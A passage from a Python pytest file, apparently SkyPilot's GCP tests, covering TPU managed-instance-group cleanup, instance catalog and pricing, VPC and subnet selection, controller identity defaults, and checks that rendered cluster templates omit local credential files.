        'load_resource',
        classmethod(lambda cls: compute),
    )

    instance_utils.GCPManagedInstanceGroup._delete_tpu_mig_resources(
        'project', 'us-east5', 'cluster')

    assert operation_wait.call_count == 2
    assert operation_wait.call_args_list == [
        call(project='project', region='us-east5',
             operation='delete-policy-op'),
        call(project='project', region='us-east5',
             operation='delete-policy-op'),
    ]


def test_gcp_delete_mig_cleans_tpu_policy_after_mig_expired(monkeypatch):
    calls = []
    monkeypatch.setattr(
        mig_utils, 'check_region_managed_instance_group_exists',
        lambda *args, **kwargs: calls.append(('check-mig', args)) or False)
    monkeypatch.setattr(
        mig_utils, 'check_workload_policy_exists',
        lambda *args, **kwargs: calls.append(('check-policy', args)) or True)
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup, 'delete_tpu_mig_resources',
        classmethod(lambda cls, *args, **kwargs: calls.append(
            ('delete-tpu-resources', args)) or False))
    monkeypatch.setattr(
        mig_utils, 'cancel_all_resize_request_for_mig', lambda *args, **kwargs:
        (_ for _ in ()).throw(
            AssertionError('TPU cleanup must not use zonal resize requests')))

    deleted = instance_utils.GCPManagedInstanceGroup.delete_mig(
        'project', 'us-east5-a', 'cluster')

    assert deleted is False
    assert calls == [
        ('check-mig', ('project', 'us-east5', 'sky-mig-cluster')),
        ('check-policy', ('project', 'us-east5', 'sky-wp-cluster')),
        ('delete-tpu-resources', ('project', 'us-east5', 'cluster')),
    ]


def test_gcp_terminate_mig_auto_detects_compute_tpu_resources(monkeypatch):
    delete_mig = MagicMock(return_value=True)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'delete_mig',
                        delete_mig)
    filter_instances = MagicMock()
    monkeypatch.setattr(gcp_instance, '_filter_instances', filter_instances)

    # Compute TPU VMs do not use the legacy provider._has_tpus marker.
    gcp_instance.terminate_instances('cluster',
                                     provider_config={
                                         'availability_zone': 'us-east5-a',
                                         'project_id': 'project',
                                         'use_managed_instance_group': True,
                                     })

    delete_mig.assert_called_once_with('project', 'us-east5-a', 'cluster')
    filter_instances.assert_not_called()


def test_gcp_terminate_mig_uses_persisted_tpu_marker(monkeypatch):
    delete_mig = MagicMock(return_value=True)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'delete_mig',
                        delete_mig)
    monkeypatch.setattr(
        mig_utils, 'check_region_managed_instance_group_exists',
        lambda *args, **kwargs: (_ for _ in ()).throw(
            AssertionError('Persisted TPU marker must bypass existence probes')
        ))
    monkeypatch.setattr(
        mig_utils, 'check_workload_policy_exists', lambda *args, **kwargs:
        (_ for _ in ()).throw(
            AssertionError('Persisted TPU marker must bypass existence probes')
        ))

    gcp_instance.terminate_instances('cluster',
                                     provider_config={
                                         'availability_zone': 'us-east5-a',
                                         'project_id': 'project',
                                         'use_managed_instance_group': True,
                                         '_is_tpu_mig': True,
                                     })

    delete_mig.assert_called_once_with('project',
                                       'us-east5-a',
                                       'cluster',
                                       is_tpu_mig=True)


@pytest.mark.parametrize(('instance_type', 'region'), [
    ('ct6e-standard-4t', 'us-south1'),
    ('tpu7x-standard-4t', 'us-central1'),
])
def test_managed_job_cleanup_deletes_gcp_tpu_mig_orphan(monkeypatch,
                                                        instance_type, region):
    calls = []
    monkeypatch.setattr(global_user_state, 'get_handle_from_cluster_name',
                        lambda _: None)
    monkeypatch.setattr(GCP, 'get_project_id',
                        classmethod(lambda cls, dryrun=False: 'project'))
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup, 'delete_tpu_mig_resources',
        classmethod(lambda cls, *args, **kwargs: calls.append((args, kwargs))))

    task = task_lib.Task(name='train')
    task_resources = resources.Resources(
        cloud=GCP(),
        instance_type=instance_type,
        region=region,
        _cluster_config_overrides={
            'gcp': {
                'managed_instance_group': {
                    'run_duration': 3600,
                    'provision_timeout': 900,
                    'accelerator_topology': '4x4',
                    'accelerator_topology_mode': 'AUTO_CONNECT',
                },
            },
        },
    )
    task.set_resources({task_resources})
    task.best_resources = task_resources

    cluster_name = 'spectra-300m-h14-noint-7i-6'
    managed_job_controller._cleanup_gcp_tpu_mig_if_needed(task, cluster_name)

    assert calls == [(
        (
            'project',
            region,
            common_utils.make_cluster_name_on_cloud(
                cluster_name, max_length=GCP().max_cluster_name_length()),
        ),
        {},
    )]


def test_managed_job_cleanup_uses_persisted_gcp_provider_config(monkeypatch):
    calls = []
    launched_resources = resources.Resources(cloud=GCP(),
                                             instance_type='ct6e-standard-4t',
                                             region='us-east5')
    handle = MagicMock()
    handle.launched_resources = launched_resources
    handle.cluster_yaml = '~/.sky/generated/persisted.yml'
    handle.cluster_name_on_cloud = 'persisted-cloud-name'
    monkeypatch.setattr(global_user_state, 'get_handle_from_cluster_name',
                        lambda _: handle)
    monkeypatch.setattr(
        global_user_state, 'get_cluster_yaml_dict', lambda _: {
            'provider': {
                'project_id': 'persisted-project',
                'region': 'us-east5',
                'use_managed_instance_group': True,
            },
        })
    monkeypatch.setattr(
        GCP, 'get_project_id',
        classmethod(lambda cls, dryrun=False: (_ for _ in ()).throw(
            AssertionError('Current workspace project must not be used.'))))
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup, 'delete_tpu_mig_resources',
        classmethod(lambda cls, *args, **kwargs: calls.append((args, kwargs))))

    task = task_lib.Task(name='train')
    task.set_resources({
        resources.Resources(cloud=GCP(),
                            instance_type='ct6e-standard-4t',
                            region='us-central1')
    })

    managed_job_controller._cleanup_gcp_tpu_mig_if_needed(
        task, 'managed-cluster')

    assert calls == [((
        'persisted-project',
        'us-east5',
        'persisted-cloud-name',
    ), {})]


def test_gcp_ct6e_mig_requires_accelerator_topology(monkeypatch):
    monkeypatch.setattr(mig_utils, 'check_instance_template_exits',
                        lambda *args, **kwargs: True)
    monkeypatch.setattr(mig_utils, 'check_region_managed_instance_group_exists',
                        lambda *args, **kwargs: True)
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup, 'filter',
        classmethod(lambda cls, *args, **kwargs: {'node-0': {}}))

    with pytest.raises(common.ProvisionerError, match='accelerator_topology'):
        instance_utils.GCPManagedInstanceGroup.create_instances(
            cluster_name='cluster',
            project_id='project',
            zone='us-east5-a',
            node_config={
                gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
                    'run_duration': 3600,
                },
                'machineType': 'ct6e-standard-4t',
                'labels': {},
            },
            labels={},
            count=1,
            total_count=1,
            include_head_node=True,
        )


def test_gcp_ct6e_catalog_entries_use_documented_regions():
    assert gcp_catalog.instance_type_exists('ct6e-standard-8t') is True
    assert gcp_catalog.get_vcpus_mem_from_instance_type('ct6e-standard-8t') == (
        360, 1440)

    regions = gcp_catalog.get_region_zones_for_instance_type('ct6e-standard-8t',
                                                             use_spot=False)

    expected_region_to_zones = {
        'us-central1': ('us-central1-b',),
        'us-east1': ('us-east1-d',),
        'us-east5': ('us-east5-a', 'us-east5-b'),
        'us-south1': ('us-south1-ai1b',),
        'asia-northeast1': ('asia-northeast1-b',),
        'europe-west4': ('europe-west4-a',),
        'southamerica-west1': ('southamerica-west1-a',),
    }
    assert [region.name for region in regions] == list(expected_region_to_zones)
    assert {
        region.name: tuple(zone.name for zone in region.zones)
        for region in regions
    } == expected_region_to_zones


@pytest.mark.parametrize(('instance_type', 'expected_region_to_zones'), [
    ('ct6e-standard-4t', {
        'us-east5': ('us-east5-a',),
        'us-south1': ('us-south1-ai1b',),
        'asia-northeast1': ('asia-northeast1-b',),
    }),
    ('tpu7x-standard-4t', {
        'us-central1': ('us-central1-c',),
    }),
])
def test_gcp_compute_tpu_mig_offerings_use_flex_start_zones(
        instance_type, expected_region_to_zones):
    resource = resources.Resources(cloud=GCP(),
                                   instance_type=instance_type,
                                   _cluster_config_overrides={
                                       'gcp': {
                                           'managed_instance_group': {
                                               'run_duration': 3600,
                                               'accelerator_topology': '2x4',
                                           },
                                       },
                                   })

    regions = GCP.regions_with_offering(instance_type,
                                        accelerators=None,
                                        use_spot=False,
                                        region=None,
                                        zone=None,
                                        resources=resource)

    assert {
        region.name: tuple(zone.name for zone in region.zones)
        for region in regions
    } == expected_region_to_zones


def test_gcp_ct6e_ai_zone_validates():
    assert gcp_catalog.validate_region_zone(
        'us-south1', 'us-south1-ai1b') == ('us-south1', 'us-south1-ai1b')
    assert gcp_catalog.validate_region_zone(
        None, 'us-south1-ai1b') == ('us-south1', 'us-south1-ai1b')
    with pytest.raises(ValueError, match='Invalid zone'):
        gcp_catalog.validate_region_zone('us-east5', 'us-south1-ai1b')


def test_gcp_ct6e_catalog_uses_tpu_v6e_price(monkeypatch):
    calls = []

    def mock_accelerator_hourly_cost(accelerator,
                                     count,
                                     use_spot=False,
                                     region=None,
                                     zone=None):
        calls.append((accelerator, count, use_spot, region, zone))
        return 42.0

    monkeypatch.setattr(gcp_catalog, 'get_accelerator_hourly_cost',
                        mock_accelerator_hourly_cost)

    assert gcp_catalog.get_hourly_cost('ct6e-standard-8t',
                                       use_spot=False,
                                       region='us-east5',
                                       zone='us-east5-a') == 42.0
    assert calls == [('tpu-v6e-8', 1, False, 'us-east5', None)]


def test_gcp_ct6e_spot_is_not_launchable():
    assert gcp_catalog.get_region_zones_for_instance_type('ct6e-standard-8t',
                                                          use_spot=True) == []
    with pytest.raises(ValueError, match='do not support spot'):
        gcp_catalog.get_hourly_cost('ct6e-standard-8t', use_spot=True)


def test_gcp_tpu7x_catalog_entries():
    assert gcp_catalog.instance_type_exists('tpu7x-standard-4t') is True
    assert gcp_catalog.instance_type_exists('tpu7x-standard-4t-tpu') is True
    assert gcp_catalog.get_vcpus_mem_from_instance_type(
        'tpu7x-standard-4t') == (224, 960)
    assert gcp_catalog.get_hourly_cost('tpu7x-standard-4t',
                                       use_spot=False,
                                       region='us-central1',
                                       zone='us-central1-c') == 48.0

    regions = gcp_catalog.get_region_zones_for_instance_type(
        'tpu7x-standard-4t', use_spot=False)
    assert [region.name for region in regions] == ['us-central1']
    assert [zone.name for zone in regions[0].zones] == [
        'us-central1-ai1a',
        'us-central1-c',
    ]
    assert gcp_catalog.validate_region_zone(
        None, 'us-central1-ai1a') == ('us-central1', 'us-central1-ai1a')


def test_gcp_tpu7x_spot_is_not_launchable():
    assert gcp_catalog.get_region_zones_for_instance_type('tpu7x-standard-4t',
                                                          use_spot=True) == []
    with pytest.raises(ValueError, match='do not support spot'):
        gcp_catalog.get_hourly_cost('tpu7x-standard-4t', use_spot=True)


@pytest.mark.parametrize(
    ('instance_type', 'region_name', 'zone_name', 'image_family'), [
        ('ct6e-standard-4t', 'us-east5', 'us-east5-a',
         'ubuntu-accel-2204-amd64-tpu-v5e-v5p-v6e'),
        ('tpu7x-standard-4t', 'us-central1', 'us-central1-c',
         'ubuntu-accel-2404-amd64-tpu-tpu7x'),
    ])
def test_gcp_compute_tpu_uses_accelerator_image_by_default(
        instance_type, region_name, zone_name, image_family):
    resource = resources.Resources(cloud=GCP(),
                                   instance_type=instance_type,
                                   region=region_name)
    region = Region(region_name).set_zones([Zone(zone_name)])

    variables = GCP().make_deploy_resources_variables(
        resource,
        resources_utils.ClusterName('test', 'test'),
        region,
        region.zones,
        num_nodes=1,
        dryrun=True)

    assert variables['image_id'] == (
        'projects/ubuntu-os-accelerator-images/global/images/family/'
        f'{image_family}')
    assert variables['docker_run_options'] == ['--privileged']
    assert variables['is_compute_tpu'] is True


@pytest.mark.parametrize(('instance_type', 'expected_threads_per_core'), [
    ('ct6e-standard-8t', 1),
    ('ct6e-standard-8t-tpu', 1),
    ('ct6e-standard-4t', None),
    ('tpu7x-standard-4t', None),
])
def test_gcp_compute_tpu_threads_per_core(instance_type,
                                          expected_threads_per_core):
    resource = resources.Resources(cloud=GCP(),
                                   instance_type=instance_type,
                                   region='us-east5')
    region = Region('us-east5').set_zones([Zone('us-east5-a')])

    variables = GCP().make_deploy_resources_variables(
        resource,
        resources_utils.ClusterName('test', 'test'),
        region,
        region.zones,
        num_nodes=1,
        dryrun=True)

    assert variables['threads_per_core'] == expected_threads_per_core


def test_gcp_check_quota_skips_for_managed_instance_group(monkeypatch):
    """DWS/Flex-start should not be blocked by on-demand quota precheck."""
    resources_obj = resources.Resources(cloud=GCP(),
                                        region='us-central1',
                                        accelerators={'A100-80GB': 1})
    monkeypatch.setattr(
        skypilot_config,
        'get_effective_region_config',
        lambda *args, **kwargs: {
            'run_duration': 600,
        },
    )

    def fail_if_called(*args, **kwargs):
        raise AssertionError('Quota subprocess should not be called for DWS.')

    monkeypatch.setattr(gcp_cloud.subprocess_utils, 'run', fail_if_called)

    assert GCP.check_quota_available(resources_obj) is True


@pytest.mark.parametrize(
    ('specific_reservations', 'specific_reservation_required', 'expected'), [
        ([], False, True),
        ([], True, False),
        (['projects/<project>/reservations/<reservation>'], True, True),
        (['projects/<project>/reservations/<invalid>'], True, False),
    ])
def test_gcp_reservation_is_consumable(specific_reservations,
                                       specific_reservation_required, expected):
    r = gcp_utils.GCPReservation(
        self_link=
        'https://www.googleapis.com/compute/v1/projects/<project>/zones/<zone>/reservations/<reservation>',
        specific_reservation=gcp_utils.SpecificReservation(count=1,
                                                           in_use_count=1),
        specific_reservation_required=specific_reservation_required,
        zone='zone')
    assert r.is_consumable(
        specific_reservations=specific_reservations) is expected


def test_gcp_get_user_identities_workspace_cache_bypass():
    """Test that get_user_identities bypasses cache when workspace changes."""
    # Mock the external dependencies
    credentials = MagicMock()
    credentials.get_cred_info.return_value = {
        'principal': 'test@example.com',
    }
    with patch('sky.clouds.gcp._get_default',
               return_value=(credentials, 'default-project')) as mock_get_default, \
         patch.object(GCP,
                      '_get_adc_principal',
                      return_value='test@example.com'), \
         patch.object(GCP, 'get_project_id') as mock_get_project_id, \
         patch.object(skypilot_config, 'get_workspace_cloud') as mock_get_workspace_cloud:

        # Set up different project IDs for different workspaces
        def workspace_cloud_side_effect(cloud_name):
            current_workspace = skypilot_config.get_active_workspace()
            if current_workspace == 'default':
                return {'project_id': 'default-project'}
            elif current_workspace == 'other':
                return {'project_id': 'other-project'}
            return {}

        def project_id_side_effect():
            current_workspace = skypilot_config.get_active_workspace()
            if current_workspace == 'default':
                return 'default-project'
            elif current_workspace == 'other':
                return 'other-project'
            return 'fallback-project'

        mock_get_workspace_cloud.side_effect = workspace_cloud_side_effect
        mock_get_project_id.side_effect = project_id_side_effect

        # First call in default workspace
        result1 = GCP.get_user_identities()
        expected1 = [['test@example.com [project_id=default-project]']]
        assert result1 == expected1

        # Switch to another workspace and call again
        with skypilot_config.local_active_workspace_ctx('other'):
            result2 = GCP.get_user_identities()
            expected2 = [['test@example.com [project_id=other-project]']]
            assert result2 == expected2

        # Back to default workspace - should get the original result
        result3 = GCP.get_user_identities()
        assert result3 == expected1

        # Verify that the underlying method was called for each different workspace config
        # Should be called 3 times total: once for default, once for other, once for default again
        assert mock_get_default.call_count == 2
        assert mock_get_project_id.call_count == 2

        # Verify workspace cloud was queried for each call
        assert mock_get_workspace_cloud.call_count == 3
        mock_get_workspace_cloud.assert_any_call('gcp')


def _make_subnet(name: str, vpc_name: str, project_id: str = 'test-project'):
    return {
        'name': name,
        'network': f'projects/{project_id}/global/networks/{vpc_name}',
        'selfLink': f'https://example.com/{name}',
    }


def _make_provision_config(provider_config):
    return common.ProvisionConfig(
        provider_config=provider_config,
        authentication_config={},
        docker_config={},
        node_config={},
        count=1,
        tags={},
        resume_stopped_nodes=False,
        ports_to_open_on_launch=None,
    )


def test_gcp_get_usable_vpc_and_subnet_uses_specified_subnet(monkeypatch):
    provider_config = {
        'project_id': 'test-project',
        'vpc_name': 'train-vpc',
        'subnet_names': ['train-subnet-b', 'train-subnet-a'],
    }
    provision_config = _make_provision_config(provider_config)
    monkeypatch.setattr(gcp_config, '_list_vpcnets', lambda *args, **kwargs: [{
        'name': 'train-vpc'
    }])
    monkeypatch.setattr(
        gcp_config, '_list_subnets', lambda *args, **kwargs: [
            _make_subnet('train-subnet-a', 'train-vpc'),
            _make_subnet('train-subnet-b', 'train-vpc'),
        ])

    vpc_name, subnet = gcp_config.get_usable_vpc_and_subnet(
        'cluster', 'us-central1', provision_config, MagicMock())

    assert vpc_name == 'train-vpc'
    assert subnet['name'] == 'train-subnet-b'


def test_gcp_get_usable_vpc_and_subnet_infers_vpc_from_subnet(monkeypatch):
    provider_config = {
        'project_id': 'test-project',
        'subnet_names': 'train-subnet',
    }
    provision_config = _make_provision_config(provider_config)
    monkeypatch.setattr(
        gcp_config, '_list_subnets', lambda *args, **kwargs: [
            _make_subnet('train-subnet', 'train-vpc'),
        ])

    vpc_name, subnet = gcp_config.get_usable_vpc_and_subnet(
        'cluster', 'us-central1', provision_config, MagicMock())

    assert vpc_name == 'train-vpc'
    assert subnet['name'] == 'train-subnet'


def test_gcp_get_usable_vpc_and_subnet_rejects_multiple_vpcs(monkeypatch):
    provider_config = {
        'project_id': 'test-project',
        'subnet_names': ['train-subnet-a', 'train-subnet-b'],
    }
    provision_config = _make_provision_config(provider_config)
    monkeypatch.setattr(
        gcp_config, '_list_subnets', lambda *args, **kwargs: [
            _make_subnet('train-subnet-a', 'train-vpc-a'),
            _make_subnet('train-subnet-b', 'train-vpc-b'),
        ])

    with pytest.raises(RuntimeError) as exc_info:
        gcp_config.get_usable_vpc_and_subnet('cluster', 'us-central1',
                                             provision_config, MagicMock())

    assert 'multiple VPCs' in str(exc_info.value)


def test_gcp_get_usable_vpc_and_subnet_partial_name_match(monkeypatch):
    provider_config = {
        'project_id': 'test-project',
        'vpc_name': 'train-vpc',
        'subnet_names': ['missing-subnet', 'train-subnet-b'],
    }
    provision_config = _make_provision_config(provider_config)
    monkeypatch.setattr(gcp_config, '_list_vpcnets', lambda *args, **kwargs: [{
        'name': 'train-vpc'
    }])
    monkeypatch.setattr(
        gcp_config, '_list_subnets', lambda *args, **kwargs: [
            _make_subnet('train-subnet-a', 'train-vpc'),
            _make_subnet('train-subnet-b', 'train-vpc'),
        ])

    vpc_name, subnet = gcp_config.get_usable_vpc_and_subnet(
        'cluster', 'us-central1', provision_config, MagicMock())

    assert vpc_name == 'train-vpc'
    assert subnet['name'] == 'train-subnet-b'


def test_gcp_get_usable_vpc_and_subnet_empty_subnet_names(monkeypatch):
    provider_config = {
        'project_id': 'test-project',
        'vpc_name': 'train-vpc',
        'subnet_names': [],
    }
    provision_config = _make_provision_config(provider_config)
    monkeypatch.setattr(gcp_config, '_list_vpcnets', lambda *args, **kwargs: [{
        'name': 'train-vpc'
    }])
    monkeypatch.setattr(
        gcp_config, '_list_subnets', lambda *args, **kwargs: [
            _make_subnet('train-subnet-a', 'train-vpc'),
            _make_subnet('train-subnet-b', 'train-vpc'),
        ])

    vpc_name, subnet = gcp_config.get_usable_vpc_and_subnet(
        'cluster', 'us-central1', provision_config, MagicMock())

    assert vpc_name == 'train-vpc'
    assert subnet['name'] == 'train-subnet-a'


def test_gcp_get_usable_vpc_and_subnet_shared_vpc_with_subnet_names(
        monkeypatch):
    provider_config = {
        'project_id': 'service-project',
        'vpc_name': 'host-project/train-vpc',
        'subnet_names': ['train-subnet-b'],
    }
    provision_config = _make_provision_config(provider_config)
    seen_projects = []

    def list_vpcnets(project_id, *args, **kwargs):
        seen_projects.append(project_id)
        return [{'name': 'train-vpc'}]

    def list_subnets(project_id, *args, **kwargs):
        seen_projects.append(project_id)
        return [
            _make_subnet('train-subnet-a',
                         'train-vpc',
                         project_id='host-project'),
            _make_subnet('train-subnet-b',
                         'train-vpc',
                         project_id='host-project'),
        ]

    monkeypatch.setattr(gcp_config, '_list_vpcnets', list_vpcnets)
    monkeypatch.setattr(gcp_config, '_list_subnets', list_subnets)

    vpc_name, subnet = gcp_config.get_usable_vpc_and_subnet(
        'cluster', 'us-central1', provision_config, MagicMock())

    assert seen_projects == ['host-project', 'host-project']
    assert vpc_name == 'train-vpc'
    assert subnet['name'] == 'train-subnet-b'
    assert subnet['network'] == (
        'projects/host-project/global/networks/train-vpc')


def test_gcp_minimal_compute_permissions_skip_firewall_for_custom_subnet():

    def get_effective_region_config_side_effect(cloud,
                                                region,
                                                keys,
                                                default_value=None,
                                                **kwargs):
        del cloud, region, kwargs
        if keys == ('subnet_names',):
            return ['train-subnet']
        return default_value

    with patch.object(skypilot_config,
                      'get_effective_region_config',
                      side_effect=get_effective_region_config_side_effect):
        permissions = gcp_utils.get_minimal_compute_permissions()

    for permission in gcp_constants.FIREWALL_PERMISSIONS:
        assert permission not in permissions


def test_gcp_minimal_compute_permissions_include_firewall_for_empty_subnets():

    def get_effective_region_config_side_effect(cloud,
                                                region,
                                                keys,
                                                default_value=None,
                                                **kwargs):
        del cloud, region, kwargs
        if keys == ('subnet_names',):
            return []
        return default_value

    with patch.object(skypilot_config,
                      'get_effective_region_config',
                      side_effect=get_effective_region_config_side_effect):
        permissions = gcp_utils.get_minimal_compute_permissions()

    for permission in gcp_constants.FIREWALL_PERMISSIONS:
        assert permission in permissions


def test_gcp_network_config_override_in_cluster_config(monkeypatch):
    """Test that GCP network overrides are passed through to the template."""
    monkeypatch.setattr(common_utils, 'make_cluster_name_on_cloud',
                        lambda *args, **kwargs: args[0])
    monkeypatch.setattr(backend_utils, '_get_yaml_path_from_cluster_name',
                        lambda *args, **kwargs: '/tmp/fake-gcp-yaml-path')
    monkeypatch.setattr(resources.Resources, 'make_deploy_variables',
                        lambda *args, **kwargs: {'region': 'us-central1'})
    monkeypatch.setattr(logs, 'get_logging_agent', lambda *args, **kwargs: None)
    monkeypatch.setattr(
        backend_utils.auth_utils, 'get_or_generate_keys',
        lambda *args, **kwargs:
        ('/tmp/fake-private-key', '/tmp/fake-public-key'))

    config_dict = config_utils.Config.from_dict({})
    monkeypatch.setattr(skypilot_config, '_get_loaded_config',
                        lambda *args, **kwargs: config_dict)

    override_configs = {
        'gcp': {
            'vpc_name': 'override-vpc',
            'subnet_names': ['override-subnet'],
        },
    }

    def fill_template_side_effect(*args, **kwargs):
        del kwargs
        template_vars = args[1]
        assert template_vars['vpc_name'] == 'override-vpc'
        assert template_vars['subnet_names'] == ['override-subnet']
        raise RuntimeError('fake-error')

    monkeypatch.setattr(common_utils, 'fill_template',
                        fill_template_side_effect)

    with pytest.raises(RuntimeError):
        backend_utils.write_cluster_config(
            to_provision=resources.Resources(
                cloud=GCP(),
                instance_type='n1-standard-4',
                _cluster_config_overrides=override_configs),
            num_nodes=1,
            cluster_config_template='gcp-ray.yml.j2',
            cluster_name='fake-gcp-cluster',
            local_wheel_path=pathlib.Path('fake-wheel-path'),
            wheel_hash='fake-wheel-hash',
            region=Region(name='us-central1'),
            zones=[Zone(name='us-central1-a')])


def test_gcp_controller_defaults_to_service_account_remote_identity(
        monkeypatch):
    monkeypatch.setattr(controller_utils.global_user_state,
                        'get_handle_from_cluster_name',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(skypilot_config, '_get_loaded_config',
                        lambda: config_utils.Config.from_dict({}))

    controller_resources = controller_utils.get_controller_resources(
        controller_utils.Controllers.JOBS_CONTROLLER,
        task_resources=[
            resources.Resources(cloud=GCP(),
                                instance_type='n1-standard-4',
                                region='us-central1')
        ])
    controller_resource = next(iter(controller_resources))

    assert skypilot_config.get_effective_workspace_region_config(
        cloud='gcp',
        region='us-central1',
        keys=('remote_identity',),
        default_value=None,
        override_configs=controller_resource.cluster_config_overrides,
    ) == schemas.RemoteIdentityOptions.SERVICE_ACCOUNT.value


def test_cloud_agnostic_controller_carries_gcp_service_account_default(
        monkeypatch):
    monkeypatch.setattr(controller_utils.global_user_state,
                        'get_handle_from_cluster_name',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(skypilot_config, '_get_loaded_config',
                        lambda: config_utils.Config.from_dict({}))

    controller_resources = controller_utils.get_controller_resources(
        controller_utils.Controllers.JOBS_CONTROLLER,
        task_resources=[resources.Resources(cpus='4+')])
    controller_resource = next(iter(controller_resources))

    assert controller_resource.cloud is None
    assert skypilot_config.get_effective_workspace_region_config(
        cloud='gcp',
        region=None,
        keys=('remote_identity',),
        default_value=None,
        override_configs=controller_resource.cluster_config_overrides,
    ) == schemas.RemoteIdentityOptions.SERVICE_ACCOUNT.value


def test_gcp_controller_respects_explicit_local_credentials(monkeypatch):
    monkeypatch.setattr(controller_utils.global_user_state,
                        'get_handle_from_cluster_name',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(
        skypilot_config, '_get_loaded_config',
        lambda: config_utils.Config.from_dict({
            'gcp': {
                'remote_identity': schemas.RemoteIdentityOptions.
                                   LOCAL_CREDENTIALS.value,
            },
        }))

    controller_resources = controller_utils.get_controller_resources(
        controller_utils.Controllers.JOBS_CONTROLLER,
        task_resources=[
            resources.Resources(cloud=GCP(),
                                instance_type='n1-standard-4',
                                region='us-central1')
        ])
    controller_resource = next(iter(controller_resources))

    assert skypilot_config.get_effective_workspace_region_config(
        cloud='gcp',
        region='us-central1',
        keys=('remote_identity',),
        default_value=None,
        override_configs=controller_resource.cluster_config_overrides,
    ) == schemas.RemoteIdentityOptions.LOCAL_CREDENTIALS.value


def test_gcp_template_does_not_mutate_remote_credentials(tmp_path):

    def render(remote_identity: str, **overrides) -> str:
        output_path = tmp_path / f'gcp-{remote_identity}.yaml'
        template_vars = {
            'cluster_name_on_cloud': 'test-cluster',
            'num_nodes': 1,
            'docker_image': None,
            'docker_run_options': [],
            'docker_login_config': None,
            'region': 'us-central1',
            'zones': 'us-central1-a',
            'gcp_project_id': 'test-project',
            'vpc_name': None,
            'subnet_names': None,
            'firewall_rule': None,
            'use_internal_ips': False,
            'force_enable_external_ips': False,
            'tpu_vm': False,
            'tpu_node_name': None,
            'gcp_use_managed_instance_group': False,
            'gcp_use_managed_instance_group_value': '',
            'gcp_is_tpu_mig': False,
            'enable_gvnic': None,
            'enable_gpu_direct': None,
            'placement_policy': None,
            'network_tier': None,
            'ssh_private_key': '/tmp/sky-key',
            'ssh_proxy_command': None,
            'user': 'test-user',
            'labels': {},
            'specific_reservations': [],
            'gpu': None,
            'machine_image': None,
            'instance_type': 'n1-standard-4',
            'is_compute_tpu': False,
            'threads_per_core': None,
            'disk_size': 50,
            'image_id': 'projects/test-project/global/images/test-image',
            'disk_tier': 'pd-balanced',
            'disk_iops': None,
            'volumes': [],
            'user_data': None,
            'use_spot': False,
            'gcp_queued_resource': None,
            'sky_ray_yaml_remote_path': '~/ray.yml',
            'sky_ray_yaml_local_path': '/tmp/ray.yml',
            'sky_remote_path': '~/.sky',
            'sky_wheel_hash': 'wheel-hash',
            'sky_local_path': '/tmp/sky-wheel',
            'credentials': {},
            'initial_setup_commands': [],
            'conda_installation_commands': '',
            'uv_installation_commands': '',
            'sky_pip_cmd': 'python -m pip',
            'ray_skypilot_installation_commands': '',
            'copy_skypilot_templates_commands': '',
            'ssh_max_sessions_config': '',
            'remote_identity': remote_identity,
        }
        template_vars.update(overrides)
        common_utils.fill_template('gcp-ray.yml.j2', template_vars,
                                   str(output_path))
        return output_path.read_text(encoding='utf-8')

    service_account_rendered = render(
        schemas.RemoteIdentityOptions.SERVICE_ACCOUNT.value)
    local_credentials_rendered = render(
        schemas.RemoteIdentityOptions.LOCAL_CREDENTIALS.value)

    for rendered in (service_account_rendered, local_credentials_rendered):
        assert 'application_default_credentials.json' not in rendered
        assert 'credentials.db' not in rendered
        assert 'auth/impersonate_service_account' not in rendered
        assert rendered.count('"~/.ssh/sky-cluster-key"') == 1

    ct6e_rendered = render(schemas.RemoteIdentityOptions.SERVICE_ACCOUNT.value,
                           instance_type='ct6e-standard-8t',
                           is_compute_tpu=True,
                           threads_per_core=1)
    assert 'advancedMachineFeatures:\n        threadsPerCore: 1' in (
        ct6e_rendered)
    assert 'scheduling:\n        onHostMaintenance: TERMINATE' in (
        ct6e_rendered)


# --- Tests for _is_reservation_bound ---


class TestIsReservationBound:
    """Tests for DENSE/CALENDAR reservation detection."""

    @patch('sky.provision.gcp.instance_utils'
           '.GCPComputeInstance.load_resource')
    def test_dense_reservation_returns_true(self, mock_load):
        """DENSE reservation should trigger RESERVATION_BOUND."""
        from sky.provision.gcp.instance_utils import _is_reservation_bound
        mock_compute = MagicMock()
        mock_load.return_value = mock_compute
        mock_compute.reservations.return_value.list.return_value \
            .execute.return_value = {
                'items': [{
                    'name': 'my-dense-reservation',
                    'deploymentType': 'DENSE',
                }]
            }

        result = _is_reservation_bound('my-project', 'us-central1-a',
                                       'my-dense-reservation')
        assert result is True

        mock_compute.reservations.return_value.list.assert_called_once_with(
            project='my-project',
            zone='us-central1-a',
            filter='name=my-dense-reservation',
        )

    @patch('sky.provision.gcp.instance_utils'
           '.GCPComputeInstance.load_resource')
    def test_standard_reservation_returns_false(self, mock_load):
        """Standard (SPECIFIC) reservation should not trigger override."""
        from sky.provision.gcp.instance_utils import _is_reservation_bound
        mock_compute = MagicMock()
        mock_load.return_value = mock_compute
        mock_compute.reservations.return_value.list.return_value \
            .execute.return_value = {
                'items': [{
                    'name': 'my-standard-reservation',
                    'deploymentType': 'DEPLOYMENT_TYPE_UNSPECIFIED',
                }]
            }

        result = _is_reservation_bound('my-project', 'us-central1-a',
                                       'my-standard-reservation')
        assert result is False

    @patch('sky.provision.gcp.instance_utils'
           '.GCPComputeInstance.load_resource')
    def test_no_deployment_type_returns_false(self, mock_load):
        """Reservation without deploymentType field should not override."""
        from sky.provision.gcp.instance_utils import _is_reservation_bound
        mock_compute = MagicMock()
        mock_load.return_value = mock_compute
        mock_compute.reservations.return_value.list.return_value \
            .execute.return_value = {
                'items': [{
                    'name': 'my-reservation',
                }]
            }

        result = _is_reservation_bound('my-project', 'us-central1-a',
                                       'my-reservation')
        assert result is False

    @patch('sky.provision.gcp.instance_utils'
           '.GCPComputeInstance.load_resource')
    def test_reservation_not_found_returns_false(self, mock_load):
        """Empty list result should return False."""
        from sky.provision.gcp.instance_utils import _is_reservation_bound
